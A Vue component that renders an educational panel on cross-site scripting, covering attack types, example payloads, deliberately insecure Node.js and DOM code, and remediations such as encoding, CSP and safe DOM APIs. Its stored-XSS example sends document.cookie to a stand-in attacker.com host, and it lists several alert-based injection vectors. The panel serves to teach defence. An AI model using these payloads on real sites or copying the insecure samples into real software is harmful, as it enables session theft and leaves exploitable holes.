<template>
  <div class="xss-guidance">
    <div class="mb-4">
      <h4 class="text-lg font-medium mb-2">XSS Cross-Site Scripting Vulnerability Explained</h4>
      <p class="text-sm text-gray-700 mb-3">
        Cross-site scripting (XSS) attacks allow attackers to inject malicious JavaScript code into web pages, causing it to execute in the user's browser. This can lead to session hijacking, data theft, phishing attacks, and other security threats.
      </p>
    </div>
    
    <div class="mb-4">
      <h4 class="text-base font-medium mb-2">Main Types of XSS</h4>
      <el-tag type="danger" class="mr-2 mb-2">Reflected XSS</el-tag>
      <el-tag type="warning" class="mr-2 mb-2">Stored XSS</el-tag>
      <el-tag type="info" class="mr-2 mb-2">DOM-based XSS</el-tag>
      
      <el-collapse accordion class="mt-2">
        <el-collapse-item title="Reflected XSS">
          <p class="text-sm text-gray-700 mb-2">
            Malicious code is included in the request (usually as a URL parameter) and then reflected by the server into the page. When a user clicks a malicious link, the code executes in the user's browser.
          </p>
          <div class="bg-gray-50 p-3 rounded font-mono text-sm overflow-auto">
            <p>Example URL:</p>
            <code class="text-red-500">https://example.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
          </div>
        </el-collapse-item>
        
        <el-collapse-item title="Stored XSS">
          <p class="text-sm text-gray-700 mb-2">
            Malicious code is permanently stored on the server (such as in a database). When other users visit a page containing this data, the attack code executes.
          </p>
          <div class="bg-gray-50 p-3 rounded font-mono text-sm overflow-auto">
            <p>Example (in a comment system):</p>
            <code class="text-red-500">&lt;script&gt;document.location='https://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;</code>
          </div>
        </el-collapse-item>
        
        <el-collapse-item title="DOM-based XSS">
          <p class="text-sm text-gray-700 mb-2">
            The vulnerability exists in client-side JavaScript. The attack code does not go through the server, but directly modifies the DOM structure in the browser.
          </p>
          <div class="bg-gray-50 p-3 rounded font-mono text-sm overflow-auto">
            <p>Example code:</p>
            <pre class="text-red-500">
// Unsafe DOM operation
var pos = document.URL.indexOf("name=") + 5;
var name = document.URL.substring(pos, document.URL.length);
document.write("Hello, " + name + "!");
            </pre>
            <p>Attack URL:</p>
            <code class="text-red-500">https://example.com/page.html#name=&lt;img src=x onerror=alert('XSS')&gt;</code>
          </div>
        </el-collapse-item>
      </el-collapse>
    </div>
    
    <div class="mb-4">
      <h4 class="text-lg font-medium mb-2">Attack Examples</h4>
      <el-collapse accordion>
        <el-collapse-item title="Common XSS Attack Vectors">
          <div class="bg-gray-50 p-3 rounded mb-2 font-mono text-sm overflow-auto">
            <p class="mb-1"># Basic JavaScript execution</p>
            <p class="mb-1"><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></p>
            <p class="mb-1"># Event handler</p>
            <p class="mb-1"><code>&lt;img src="x" onerror="alert('XSS')"&gt;</code></p>
            <p class="mb-1"># JavaScript pseudo-protocol</p>
            <p class="mb-1"><code>&lt;a href="javascript:alert('XSS')"&gt;Click me&lt;/a&gt;</code></p>
            <p class="mb-1"># CSS-based attack</p>
            <p class="mb-1"><code>&lt;div style="background:url('javascript:alert(\"XSS\")')"&gt;</code></p>
            <p class="mb-1"># HTML5 features</p>
            <p class="mb-1"><code>&lt;video&gt;&lt;source onerror="alert('XSS')"&gt;&lt;/video&gt;</code></p>
          </div>
        </el-collapse-item>
        
        <el-collapse-item title="Vulnerable Code Example">
          <div class="bg-gray-50 p-3 rounded mb-2 font-mono text-sm overflow-auto">
            <p class="text-red-500 mb-2">❌ Insecure code:</p>
            <pre>
// Server-side (Node.js) example
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`
    &lt;h1&gt;Search result: ${query}&lt;/h1&gt;
    &lt;div&gt;No results found for "${query}"&lt;/div&gt;
  `);
});

// Client-side JavaScript example
document.getElementById('message').innerHTML = 
  'Welcome, ' + getParameterByName('name');
            </pre>
          </div>
        </el-collapse-item>
      </el-collapse>
    </div>
    
    <div class="mb-4">
      <h4 class="text-lg font-medium mb-2">Remediation Solutions</h4>
      
      <div class="security-solution mb-3">
        <div class="solution-title text-md font-medium text-green-700 mb-1">1. Output Encoding</div>
        <p class="text-sm text-gray-700 mb-2">
          Properly encode data according to the output context. This is the most important defense against XSS.
        </p>
        <div class="bg-green-50 p-3 rounded mb-2 font-mono text-sm overflow-auto">
          <p class="text-green-600 mb-2">✅ Secure code:</p>
          <pre>
// HTML context encoding (Node.js)
const escapeHTML = str => 
  str.replace(/[&<>"']/g, tag => 
    ({
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#39;'
    }[tag]));

app.get('/search', (req, res) => {
  const query = escapeHTML(req.query.q || '');
  res.send(`
    &lt;h1&gt;Search result: ${query}&lt;/h1&gt;
    &lt;div&gt;No results found for "${query}"&lt;/div&gt;
  `);
});

// Modern frameworks auto-escape
// Vue.js
&lt;div&gt;{{ userInput }}&lt;/div&gt;  // Auto HTML escape

// React
&lt;div&gt;{userInput}&lt;/div&gt;  // Auto HTML escape
          </pre>
        </div>
      </div>
      
      <div class="security-solution mb-3">
        <div class="solution-title text-md font-medium text-green-700 mb-1">2. Content Security Policy (CSP)</div>
        <p class="text-sm text-gray-700 mb-2">
          CSP is a browser security mechanism defined via HTTP headers or meta tags. It can restrict what resources a page can load and execute, effectively mitigating XSS attacks.
        </p>
        <div class="bg-green-50 p-3 rounded mb-2 font-mono text-sm overflow-auto">
          <p class="text-green-600 mb-2">✅ Implementation Example:</p>
          <pre>
// HTTP header implementation (Express.js)
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' https://trusted-cdn.com; style-src 'self' https://trusted-cdn.com; img-src 'self' data: https:; object-src 'none'"
  );
  next();
});

// HTML meta tag implementation
&lt;meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' https://trusted-cdn.com"&gt;
          </pre>
        </div>
      </div>
      
      <div class="security-solution mb-3">
        <div class="solution-title text-md font-medium text-green-700 mb-1">3. Safe DOM Manipulation</div>
        <p class="text-sm text-gray-700 mb-2">
          Avoid using dangerous methods like innerHTML. Use safer DOM APIs.
        </p>
        <div class="bg-green-50 p-3 rounded mb-2 font-mono text-sm overflow-auto">
          <p class="text-green-600 mb-2">✅ Safe DOM manipulation:</p>
          <pre>
// Unsafe
element.innerHTML = userInput;  // Dangerous!

// Safe alternative
element.textContent = userInput;  // Safe for text

// Create safe DOM element
const div = document.createElement('div');
div.textContent = userInput;
parentElement.appendChild(div);
          </pre>
        </div>
      </div>
      
      <div class="security-solution mb-3">
        <div class="solution-title text-md font-medium text-green-700 mb-1">4. Input Validation</div>
        <p class="text-sm text-gray-700 mb-2">
          Validate and sanitize user input. Only allow expected data formats and content.
        </p>
        <div class="bg-green-50 p-3 rounded mb-2 font-mono text-sm overflow-auto">
          <p class="text-green-600 mb-2">✅ Validation example:</p>
          <pre>
// Whitelist validation
function isValidInput(input) {
  // Only allow letters, numbers, and common punctuation
  return /^[A-Za-z0-9 .,!?-]+$/.test(input);
}

if (!isValidInput(userInput)) {
  return res.status(400).json({ error: "Invalid input" });
}
          </pre>
        </div>
      </div>
    </div>
    
    <div class="mb-4">
      <h4 class="text-lg font-medium mb-2">Other Mitigation Measures</h4>
      <ul class="list-disc pl-5 text-sm text-gray-700 space-y-1">
        <li>Use the <code>X-XSS-Protection</code> header to enable the browser's built-in XSS filter</li>
        <li>Set <code>HttpOnly</code> and <code>Secure</code> cookie flags to prevent scripts from accessing sensitive cookies</li>
        <li>Implement Subresource Integrity (SRI) to ensure external scripts have not been tampered with</li>
        <li>Use secure binding mechanisms provided by modern frameworks (Vue, React, Angular)</li>
        <li>Use HTTPS and HSTS to prevent man-in-the-middle attacks</li>
        <li>Conduct regular security audits and penetration tests</li>
      </ul>
    </div>
    
    <div class="p-3 bg-blue-50 rounded-md text-sm text-blue-800">
      <div class="font-medium mb-1">Real-time Defense:</div>
      <p>
        In addition to mitigation measures, it is recommended to implement XSS detection systems in your application to monitor abnormal request patterns and suspicious input, so as to detect and block XSS attack attempts in a timely manner. Consider integrating a Web Application Firewall (WAF) to enhance defense capabilities.
      </p>
    </div>
  </div>
</template>

<script setup>
// No additional logic required
</script>

<style scoped>
.xss-guidance {
  width: 100%;
}
</style>